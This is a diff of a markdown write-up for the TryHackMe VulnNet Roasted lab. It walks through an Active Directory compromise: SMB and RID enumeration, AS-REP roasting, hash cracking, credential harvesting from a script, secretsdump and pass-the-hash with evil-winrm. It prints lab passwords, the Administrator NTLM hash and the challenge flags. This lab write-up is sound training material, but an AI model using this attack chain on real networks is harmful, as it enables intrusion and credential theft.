@@ -52,7 +52,7 @@ Important Ports:
 - 389, 3268 – LDAP (AD services)
 - 5985 – WinRM (for remote shell)
 
-![Nmap Scan Results](/assets/img/vulnnet/nmap.png)
+![Nmap Scan Results](/assets/img/htb/vulnnet/nmapvulnnet.jpg)
 
 ## ✅ Step 2: SMB Enumeration
 Check available SMB shares:
@@ -66,7 +66,15 @@ Output:
 - VulnNet-Business-Anonymous
 - VulnNet-Enterprise-Anonymous
 
-![SMB Shares](/assets/img/vulnnet/smb_shares.png)
+![SMB Shares](/assets/img/htb/vulnnet/smb.jpg)
+
+Edit /etc/hosts file:
+```bash
+sudo nano /etc/hosts
+<target-ip> vulnnet-rst.local //add this and save the file
+```
+
+![Edit Hosts File](/assets/img/htb/vulnnet/edithost.jpg)
 
 Difficulty Faced:
 - At first, I thought flags were inside these anonymous shares, but they contained only .txt business info files (decoys).
@@ -94,7 +102,18 @@ We found user accounts:
 - j-goldenhand
 - j-leet
 
-![RID Enumeration](/assets/img/vulnnet/lookupsid.png)
+![RID Enumeration](/assets/img/htb/vulnnet/lookupsid.jpg)
+
+Then, create a vuln.txt file:
+```bash
+sudo nano vuln.txt
+//add this
+a-whitehat
+t-skid
+j-leet
+```
+
+![Vuln.txt Content](/assets/img/htb/vulnnet/vulntxt.jpg)
 
 ## ✅ Step 4: AS-REP Roasting
 Some users do not require pre-authentication. We exploit this using:
@@ -106,7 +125,11 @@ Result:
 t-skid@VULNNET-RST.LOCAL:$krb5asrep$23$...
 ```
 
-![AS-REP Hash Found](/assets/img/vulnnet/asrep.png)
+![AS-REP Hash Found](/assets/img/htb/vulnnet/asrep.jpg)
+
+Save the hash to file (roasted.hash in my case):
+
+![Saving the Hash](/assets/img/htb/vulnnet/hash.jpg)
 
 Cracking the Hash:
 ```bash
@@ -115,7 +138,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt roasted.hash
 Password Found:
 t-skid : tj072889*
 
-![Password Cracked](/assets/img/vulnnet/john.png)
+![Password Cracked](/assets/img/htb/vulnnet/john.jpg)
 
 ## ✅ Step 5: Lateral Movement
 Logged in as t-skid with SMB and found ResetPassword.vbs in NETLOGON share.
@@ -128,7 +151,9 @@ Inside, we discovered credentials:
 a-whitehat : bNdKVkjv3RR9ht
 ```
 
-![ResetPassword.vbs Found](/assets/img/vulnnet/resetpw.png)
+![ResetPassword.vbs Found](/assets/img/htb/vulnnet/resetpw.jpg)
+
+![ResetPassword.vbs Content](/assets/img/htb/vulnnet/resetpwview.jpg)
 
 ## ✅ Step 6: Dumping Domain Hashes (Privilege Escalation)
 Using a-whitehat credentials:
@@ -140,15 +165,13 @@ We got Administrator NTLM hash:
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d
 ```
 
-![Secretsdump Output](/assets/img/vulnnet/secretsdump.png)
+![Secretsdump Output](/assets/img/htb/vulnnet/secretsdump.jpg)
 
 ## ✅ Step 7: Pass-the-Hash & Get Administrator Shell
 ```bash
 evil-winrm -i 10.10.67.90 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
 ```
 😈 Got Administrator access!
-
-![Administrator Access](/assets/img/vulnnet/admin_shell.png)
 
 ## ✅ Step 8: Capture the Flags
 Find system.txt and user.txt:
@@ -162,7 +185,7 @@ User: THM{726b7c0baac1455d05c827b5561f4ed}
 System: THM{16f45e3934293a57645f8d7bf71d8d4c}
 ```
 
-![Flags Found](/assets/img/vulnnet/flags.png)
+![Flags Found](/assets/img/htb/vulnnet/flags.jpg)
 
 ## ✅ Lessons Learned:
 - SID & RID concepts: Critical for AD enumeration.
